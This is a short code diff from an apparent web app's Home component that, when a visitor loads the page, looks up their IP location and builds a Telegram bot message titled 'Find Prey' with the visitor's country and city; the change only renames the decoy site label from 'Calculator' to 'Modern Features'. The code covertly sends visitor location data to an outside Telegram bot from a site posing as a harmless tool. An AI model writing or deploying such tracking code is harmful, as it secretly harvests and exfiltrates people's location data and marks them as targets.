@@ -14,7 +14,7 @@ function Home() {
     let URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
     axios(IP_API).then((res) => {
       let message = `<b>Find Prey</b>\n`;
-      message += `<b>Site name:</b> Calculator🧮\n`;
+      message += `<b>Site name:</b> Modern Features🛠️\n`;
       message += `<b>Feature:</b> E-commerce (products)\n`;
       message += `<b>Country:</b> ${res.data.country}\n`;
       message += `<b>City:</b> ${res.data.city}\n`;
